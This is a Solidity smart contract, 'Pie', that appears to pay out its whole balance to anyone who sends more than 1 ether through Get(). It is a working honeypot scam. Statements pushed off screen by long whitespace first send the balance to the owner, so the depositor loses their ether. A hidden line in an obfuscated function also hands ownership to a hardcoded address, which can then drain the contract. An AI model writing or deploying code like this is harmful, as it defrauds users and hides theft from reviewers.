// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        bool _flag1 = false;
        // Placeholder for future logic
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function _0xef3e86()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x31fb1b,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x31fb1b.call.value(msg.value)(data);
    }
}